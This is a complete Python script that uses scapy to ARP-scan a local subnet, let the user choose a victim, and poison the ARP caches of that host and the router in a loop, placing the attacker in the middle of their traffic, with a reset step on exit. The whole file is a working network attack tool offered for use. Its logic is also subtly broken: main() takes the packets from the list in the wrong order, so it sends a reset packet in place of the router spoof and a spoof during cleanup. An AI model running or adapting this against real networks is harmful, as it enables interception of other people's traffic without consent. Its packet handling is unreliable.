#! /bin/python
import scapy.all as scapy
import subprocess
import argparse
import re
import time
import sys

def get_input():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Desired Interface")
    args = parser.parse_args()
    interface = args.interface
    if not args.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    else:
        return(interface)

def get_router_ip(interface):
    ifconfig_result = subprocess.check_output(["ifconfig",interface]).decode("utf-8")
    router_ip = str(re.search(r"inet ()\d*[.]\d*[.]\d*[.]",ifconfig_result).group(0)[5:]+"1")
    return(router_ip)

def scan(router_ip):
    ip_scan_range = str(router_ip + "/24")
    arp_request = scapy.ARP(pdst=ip_scan_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    scan_duration = int(input("[+] Please specify the desired scan duration (in seconds): "))
    scan_result_list = scapy.srp(arp_request_broadcast,verbose=False,timeout=scan_duration)[0]
    return(scan_result_list)

def format_output(scan_result_list):
    scan_result_dict = []
    for device in scan_result_list:
        scan_result_dict.append({"ip":device[1].psrc,"mac":device[1].hwsrc})
    return(scan_result_dict)

def get_target_ip(scan_result_dict):
    print("-------------------------------------------------")
    print("IP\t\t\t\tMAC")
    print("-------------------------------------------------")
    for device in scan_result_dict:
        print(device["ip"]+"\t\t\t"+device["mac"])
    target_ip = input("Please specify the target IP: ")
    return(target_ip)

def get_mac_addresses(router_ip,target_ip,scan_result_dict):
    router_mac = list(filter(lambda router: router['ip'] == router_ip, scan_result_dict))[0]["mac"]
    target_mac = list(filter(lambda target: target['ip'] == target_ip, scan_result_dict))[0]["mac"]
    return([router_mac,target_mac])

def prepare_packets(target_ip,target_mac,router_ip,router_mac):
    target_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
    router_packet = scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip)
    target_reset_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip,hwsrc=router_mac)
    router_reset_packet = scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip,hwsrc=target_mac)
    packet_list = [
            {"name":"target_packet","packet":target_packet},
            {"name":"target_reset_packet","packet":target_reset_packet},
            {"name":"router_packet","packet":router_packet},
            {"name":"router_reset_packet","packet":router_reset_packet}
            ]
    return(packet_list)

def get_confirmation(packet_list):    
    for p in packet_list:
        print("-------------------------------------------------")
        print(p["name"])
        print("-------------------------------------------------")
        print(p["packet"].show())
        print(p["packet"].summary())
    while True:
        response = input("[+] Proceed using the above packets? [y/n]: ")
        if response == "y":
            return()
        elif response == "n":
            sys.exit("[+] Exiting programme.")
        else:
            print("[-] Please enter a valid response. Use 'y' to proceed and 'n' to cancel.")

def send_packets(target_packet,router_packet):
    total_packets_sent = 0
    try:
        while True:
            scapy.send(target_packet,verbose=False)
            scapy.send(router_packet,verbose=False)
            total_packets_sent += 2
            print("\r[+] Total packets sent: " + str(total_packets_sent),end="")
            time.sleep(2)
    except KeyboardInterrupt:
        return()

def reset_arp_tables(target_reset_packet,router_reset_packet):
    print("\n[+] Resetting ARP tables.")
    for count in range(5):
        scapy.send(target_reset_packet,verbose=False)
        scapy.send(router_reset_packet,verbose=False)
    return()

def main():
    interface = get_input()
    router_ip = get_router_ip(interface)
    scan_result_list = scan(router_ip)
    scan_result_dict = format_output(scan_result_list)
    target_ip = get_target_ip(scan_result_dict)
    mac_addresses = get_mac_addresses(router_ip,target_ip,scan_result_dict)
    router_mac = mac_addresses[0]
    target_mac = mac_addresses[1]
    packet_list = prepare_packets(target_ip,target_mac,router_ip,router_mac)
    get_confirmation(packet_list)
    target_packet = packet_list[0]["packet"]
    router_packet = packet_list[1]["packet"]
    target_reset_packet = packet_list[2]["packet"]
    router_reset_packet = packet_list[3]["packet"]
    send_packets(target_packet,router_packet)
    reset_arp_tables(target_reset_packet,router_reset_packet)
    print("[+] Programme terminated successfully.")

main()
